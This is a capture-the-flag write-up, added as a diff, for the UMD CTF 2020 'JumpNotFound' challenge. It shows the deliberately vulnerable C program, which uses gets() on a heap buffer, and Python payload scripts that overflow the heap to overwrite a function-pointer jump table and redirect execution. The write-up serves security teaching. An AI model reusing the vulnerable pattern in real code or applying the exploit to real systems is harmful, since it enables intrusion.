@@ -1,0 +1,218 @@
+:source-highlighter: pygments
+:imagesdir: img/WriteUp-UMD-Naboo
+== Write Up JumpNotFound - UMD 2020
+
+In this article, I am going to explain how I solve the challenge JumpNotFound from the UMD CTF 2020. The goal of this challenge is to be able to call a function called `jumpToNaboo`.
+
+=== Vulnerabily
+[source,c++,numbered]
+----
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+struct coordinates
+{
+    char userinput[64];  
+    short choice;
+};
+
+struct jmptable
+{
+    void (*hyperJump1)();
+    void (*hyperJump2)();
+    void (*hyperJump3)();
+    
+};
+
+void jumpToHoth()
+{
+    printf("Jumping to Hoth...\n");
+}
+void jumpToCoruscant()
+{
+    printf("Jumping to Coruscant...\n");
+}
+void jumpToEndor()
+{
+    printf("Jumping to Endor...\n");
+}
+
+void jumpToNaboo()
+{
+    printf("Jumping to Naboo...\n *Run this on the server to get the flag. *\n");
+}
+
+int main() {
+
+  
+    char* ptr;
+    
+    struct coordinates* ptr1;
+    struct jmptable* ptr2;
+    
+    ptr1 = malloc(sizeof(struct coordinates));
+    ptr2 = malloc(sizeof(struct jmptable));
+    
+    ptr2->hyperJump1 = &jumpToHoth;
+    ptr2->hyperJump2 = &jumpToCoruscant;
+    ptr2->hyperJump3 = &jumpToEndor;
+    
+    
+    
+    while(1)
+    {
+        printf("SYSTEM CONSOLE> ");
+        gets(ptr1->userinput);
+        ptr1->choice = strtol(ptr1->userinput, &ptr, 10);
+    	
+        switch( (int)ptr1->choice)
+        {
+            case 1:
+            {
+                printf("Checking navigation...\n");
+                ptr2->hyperJump1();
+                break;
+            }
+
+            case 2:
+            {
+                printf("Checking navigation...\n");
+                ptr2->hyperJump2();
+                break;
+            }
+
+            case 3:
+            {
+                printf("Checking navigation...\n");
+                ptr2->hyperJump3();
+                break;
+            }
+
+            case 4:
+            {
+                printf("Logging out\n");
+                exit(0);
+            }
+            default:
+            {
+                printf("Check Systems\n");
+                printf("1 - Hoth\n");
+                printf("2 - Coruscant\n");
+                printf("3 - Endor\n");
+                printf("4 - Logout\n");
+            }
+
+
+        }
+    }
+    return 0;
+}
+----
+
+The program is super simple. It asks a number to the user and jump to the corresponding function. The mecanism is based on a jump table and a coordinates structure both allocated on the heap.
+
+[source,c++,numbered]
+----
+    struct coordinates* ptr1;
+    struct jmptable* ptr2;
+    
+    ptr1 = malloc(sizeof(struct coordinates));
+    ptr2 = malloc(sizeof(struct jmptable));
+----
+
+The user has control over the coordinates structure via this code:
+[source,c++,numbered]
+----
+    gets(ptr1->userinput);
+    ptr1->choice = strtol(ptr1->userinput, &ptr, 10);
+----
+
+It is obvious here that we have a buffer overflow, and more precisely a heap buffer overflow. But how can we exploit this buffer overflow to be able to redirect code execution to `jumpToNaboo` ? By overwriting the jump table of course !
+
+=== Exploit
+To exploit the buffer overflow, we will use dynamic analysis with gdb. 
+
+[source,c++,numbered]
+----
+struct coordinates
+{
+    char userinput[64];  
+    short choice;
+};
+
+struct jmptable
+{
+    void (*hyperJump1)();
+    void (*hyperJump2)();
+    void (*hyperJump3)();
+    
+};
+----
+
+Let's say that we want to overwrite the `hyperJump1` variable. For that we will "fuzz" the binary with gdb to know the padding between `userinput` and `hyperJump1` on the heap.
+
+[source,python,numbered]
+----
+p = "1" + "\x00"
+idx = 'A'
+for i in range(26):
+    p += idx * 8
+    idx = chr(ord(idx) + 1)
+
+print(p)
+----
+
+Let me explain this code.
+
+[source,python,numbered]
+----
+p = "1" + "\x00"
+----
+
+This piece of code selects the first option in the program. The C code use `strtol` to get an integer from the user input. So `strtol` will read our user input until a `0x0`. The user input is queried by `gets` that stops only when `EOF` or newline occurs. So having a `0x0` in the user input is not a problem.
+
+The remaining python code is just a loop to print `AAAAAAAABBBBBBBB ....`.
+
+Let's run the binary with this input in gdb !
+
+image::gdb.png[]
+
+We set a breakpoint at `0x4007fe` because this is the address where the call to the first jump function (the one we want to overwrite) is made.
+Once we reached this breakpoint, print the value of the register (`rdx`) that is supposed to contained the address of the needed function pointer. In our case, `rdx` is equal to `0x4b4b4b4b4b4b4a4a` wich is `KKKKKKJJ`. We successfuly overwrite the jump table ! And we know that the padding is `AAAAAAA...IIJJJJJJ`, so 78 bytes of padding.
+
+Now that we have the padding, we need to find the address of `jumpToNaboo`. For that, we use gdb too. Just print `p jumpToNaboo`. We can just do that because the binary is not compile with PIE and has only PartialRelRo.
+
+image::gdb2.png[]
+
+Now that we have everything, update our python script and theeeeeeen failed !
+
+[source,python,numbered]
+----
+idx = 'A'
+for i in range(9):
+    p += idx * 8
+    idx = chr(ord(idx) + 1)
+
+p += struct.pack("<Q",   0x40070a)
+print(p)
+----
+
+Remember, the C code uses `gets` to get the userinput and `gets` stops on newline. But the address of `jumpToNaboo` contains `0x0a` which is ... a newline. Mh.
+
+Let's try with `0x40070b` if it works.
+
+[source,python,numbered]
+----
+idx = 'A'
+for i in range(9):
+    p += idx * 8
+    idx = chr(ord(idx) + 1)
+
+p += struct.pack("<Q",   0x40070b)
+print(p)
+----
+
+image::victory.png[]
+
+IT WORKS !
